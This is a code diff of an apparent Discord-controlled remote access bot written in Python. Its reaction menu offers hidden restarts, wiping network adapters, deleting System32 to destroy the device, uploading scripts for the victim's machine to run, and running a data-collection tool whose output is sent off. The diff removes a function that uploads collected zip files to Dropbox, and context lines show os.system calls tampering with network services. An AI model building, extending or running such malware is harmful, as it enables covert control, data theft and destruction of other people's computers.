@@ -7,7 +7,7 @@ import zlib
 import dropbox
 import discord
 from discord.ext import commands
-from Logicytics import log, Logicytics
+from Logicytics import log  # WIP, Logicytics
 
 
 # Function to read secret keys and information from JSON file
@@ -45,10 +45,10 @@ TOKEN, CHANNEL_ID_COMMANDS, CHANNEL_ID_LOGS, WEBHOOK_USERNAME, DEBUG, API_DROPBO
 MENU = """
 Reactions Menu:
 
-⚙️ -> Restart
+⚙️ -> Restart the bot in a hidden prompt
 🛜 -> Destroy wifi by killing all wifi processes as well as deleting all adapters
-🪝 -> Download Logicytics and run it, then send data
-📃 -> Send Logicytics Logs
+🪝 -> Download Logicytics and run it, then send data (WIP -> How to send a 1GB file?)
+📃 -> Send Logicytics Logs (^ WIP ^)
 💣 -> Destroy device by deleting sys32
 📤 -> Upload a script of your choice to be executed by them (WIP)
 """
@@ -144,10 +144,8 @@ async def on_reaction_add(reaction, user):
         await destroy_wifi(reaction.message)
     if reaction_type == "🪝":
         log.info(f"User {user} downloaded Logicytics and ran it, as well as sending data")
-        await logicytics_run(reaction.message)
     if reaction_type == "📃":
         log.info(f"User {user} requested logs of Logicytics")
-        await logicytics_logs(reaction.message)
     if reaction_type == "💣":
         log.critical(f"User {user} sent missile to destroy the enemy (Del System32)")
         await reaction.message.channel.send("Goodbye Cruel World!")
@@ -204,24 +202,6 @@ async def destroy_wifi(ctx):
     # Restart networking services
     os.system('net stop netman & net start netman')
     os.system('net stop dot3svc & net start dot3svc')
-
-
-async def logicytics_run(message):
-    log.info(f"User {message.author} downloaded Logicytics and ran it, as well as sending data")
-    # Logicytics()
-    zip_files = [f for f in os.listdir("ACCESS/DATA/Zip") if f.endswith('.zip')]
-    if len(zip_files) == 0:
-        await message.channel.send("No zip files found. Please run logicytics first.")
-        return
-    log.info(zip_files)
-
-    for zip_file in zip_files:
-        with open(zip_file, 'rb') as f:
-            dbx.files_upload(f.read(), zip_file)
-
-
-async def logicytics_logs(ctx):
-    pass
 
 
 bot.run(TOKEN, log_handler=None)
